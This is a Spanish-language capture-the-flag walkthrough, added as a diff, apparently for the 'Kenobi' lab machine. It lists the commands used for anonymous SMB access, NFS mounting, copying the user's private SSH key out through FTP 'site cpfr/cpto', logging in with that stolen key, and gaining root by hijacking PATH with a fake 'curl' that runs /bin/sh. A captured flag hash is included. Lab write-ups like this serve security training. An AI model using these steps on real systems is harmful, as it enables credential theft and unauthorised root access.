@@ -1,0 +1,83 @@
+1. una vez hecho el nmap vemos 7 puertos abiertos:
+	21,22,80,111,139,445,2049.
+
+2.vamos por el puerto 80 aunque no contiene nada.
+
+3.vamos por el puerto 21 y nos damos cuenta que contiene una vulnerabilidad que nos permite copiar y pegar 
+archivos dentro de la maquina objetivo,por ahora no podemos hacer nada
+
+4.vamos por el puerto 445,intentamos listar los directorios que contiene compartidos.
+	y vemos que tiene un workgroup como anonymous entonces entramos con :
+
+			smbclient //<ip>/anonymous
+
+
+5.dentro encotramos un archivos llamado log.txt lo obtenemos con :
+	get <archivo>   
+
+6.Viendo el archivo nos damos cuenta en donde dejo sus llaves criptograficas el usuario kenobi 
+directorio :
+	/home/kenobi/.ssh/id_rsa.pub
+
+
+llave sha256
+
+C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q	
+
+7.Ahora ya sabemos la ubicacion de sus llaves seguimos viendo que mas podemos explotar tenemos el puerto 111 que utiliza
+rpcbind 
+
+8. ya que el puerto 111 esta abierto y vemos que utiliza el servicio 111 podemos ver que tambien esta utilizando 
+nfs entonces lo que podemos hace seria ver que directorios estan montados en su servicio nfs  con :
+	showmount -e <ip>
+
+identificamos el directorio /var y podemos montarlo en alguno de nuestros directorios y sacar el archivo que queramos.
+
+
+
+9.Ahora sabemos esto :
+
+- La ruta donde estan las llaves ssh de kenobi 
+- Podemos copiar y pegar archivos desde ftp
+- podemos sacar los archivos que se encuentran en var montandolo en nuestro sistema.
+
+10. Copiamos y pegamos las llaves ssh al directorio /var/tmp con :
+	site cpfr  /home/kenobi/.ssh/id_rsa
+	site cpto /var/tmp/id_rsa
+
+
+11.Montamos el directorio en el nuestro y ya podriamos jalar los datos.
+
+ 
+mkdir dir_mount
+
+mount <ip>:/var dir_mount
+
+12.Copiamos la id_rsa a nuestro directorio y ya que tenemos el port 22 abierto lo cual usa ssh utilizamos las llaves 
+para loggearnos con :
+	ssh -i id_rsa kenobi@<ip>
+
+nos loggeamos como kenobi y obtenemos la flag
+
+flag :
+d0b0f3f53b6caa532a83915e19224899
+
+13.una vez logeados tenemos que escalar privilegios podemos usar el archivo LinEnum.sh o este comando :
+
+	find / -perm -u=s
+
+14.Encontramos un binario llamado menu y dentro de este ejecuta otros binarios como lo son :
+
+curl
+uname
+ifconfig
+
+15.Lo que podemos hacer para escalar privilegios seria creando una copia de los binarios ejecutados y diciendo a 
+PATH que cambie a donde cree mi copia del binario ejecutar el archivo y obtener permisos root .
+
+	- cd /tmp
+	- echo "/bin/sh" > curl 
+	- export PATH=/tmp:$PATH
+	-/usr/bin/menu 
+-------------------------------------------------------------------------------------------
+
